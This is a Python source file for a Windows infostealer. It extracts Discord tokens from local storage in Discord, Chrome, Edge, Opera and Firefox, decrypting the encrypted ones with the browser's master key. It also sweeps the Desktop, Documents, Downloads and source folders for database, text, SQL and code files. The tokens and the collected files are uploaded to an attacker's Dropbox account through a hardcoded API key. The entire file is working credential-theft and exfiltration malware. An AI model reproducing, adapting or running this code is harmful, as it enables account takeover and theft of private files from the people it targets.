import os
import dropbox
import random
import base64
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import json



# 50 mb, 52.4m bytes
MAX_FILE_SIZE_ALLOWED = 52428800

# if file size is larger than 5 mb, put in low priority list
LOW_PRIORITY_FILE_SIZE = 5242880

# parsed file extensions
FILE_EXTENSIONS = [".c", ".cpp", ".txt", ".dll", ".json", ".csv", ".sql", ".db"]

# if file path contains these text, it will be skipped
SKIPPED_FILES = ["DiscordChatExporter", "HotkeysConfig"]

# all stored file paths
STORED_FILES = []

LOW_PRIORITY_FILE_PATHS = []
HIGH_PRIORITY_FILE_PATHS = []

DROPBOX_API_KEY = "sl.BZc1HBiCxfg7zp37mKXCrxL0S9ShjECf2b_yQyOWOkjjUiwQmlEXf5x5NutaZZYuCQbj0GlzFOmgGAQcZr2EKYtT6s8l32iC3Gxl72duXZDd_d4kx_sb_rddUWvGelPLORLVyt_S"

try:
    USER_PROFILE = os.environ["USERPROFILE"]
    DESKTOP = USER_PROFILE + "\\Desktop"
    # quit if desktop couldnt be found
    if not os.path.exists(DESKTOP):
        quit()
except KeyError:
    USER_PROFILE = None


try:
    client = dropbox.Dropbox(DROPBOX_API_KEY)
except:
    quit()


class TokenGrabber:
    def __init__(self):
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tokens_sent = []
        self.tokens = []


    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grab_tokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                self.tokens.append(token)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            self.tokens.append(token)


        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            self.tokens.append(token)

        return self.tokens


tokens = TokenGrabber().grab_tokens()
if tokens:
    file_name = str(random.randint(0, 500000)) + "tokens39.txt"
    try:
        client.files_upload(bytes(str(tokens).encode()), "/home/" + file_name)
    except:
        pass



def parse_all_files(path):
    for (dirpath, dirnames, filenames) in os.walk(path):
        for filename in filenames:
            for file_extension in FILE_EXTENSIONS:
                if filename.endswith(file_extension):
                    filepath = os.sep.join([dirpath, filename])
                    for skipped_file in SKIPPED_FILES:
                        if skipped_file in filepath:
                            print("Skipped including" + skipped_file)
                            continue
                    STORED_FILES.append(filepath)



if USER_PROFILE is not None:
    DESKTOP = USER_PROFILE + "\\Desktop"
    DOCUMENTS = USER_PROFILE + "\\Docudments"
    DOWNLOADS = USER_PROFILE + "\\Downloads"
    SOURCE = USER_PROFILE + "\\source"

    if os.path.exists(DESKTOP):
        parse_all_files(DESKTOP)

    if os.path.exists(DOCUMENTS):
        parse_all_files(DOCUMENTS)

    if os.path.exists(DOWNLOADS):
        parse_all_files(DOWNLOADS)

    if os.path.exists(SOURCE):
        parse_all_files(SOURCE)


for file_path in STORED_FILES:


    file_size = os.path.getsize(file_path)
    if file_size > MAX_FILE_SIZE_ALLOWED:
        continue

    if file_size > LOW_PRIORITY_FILE_SIZE: 
        LOW_PRIORITY_FILE_PATHS.append(file_path)
        continue
    
    HIGH_PRIORITY_FILE_PATHS.append(file_path)
    


UPLOADED_FILES = []

index = 0

for file_path in HIGH_PRIORITY_FILE_PATHS:
    index += 1
    f = open(file_path, "rb")
    file_name = file_path.split("\\")[-1]
    file_name = str(index) + file_name
    
    print(file_path)
    print(file_name)

    try:
        client.files_upload(f.read(), "/home/" + file_name)
        UPLOADED_FILES.append(file_name)
    except:
        pass

    f.close()
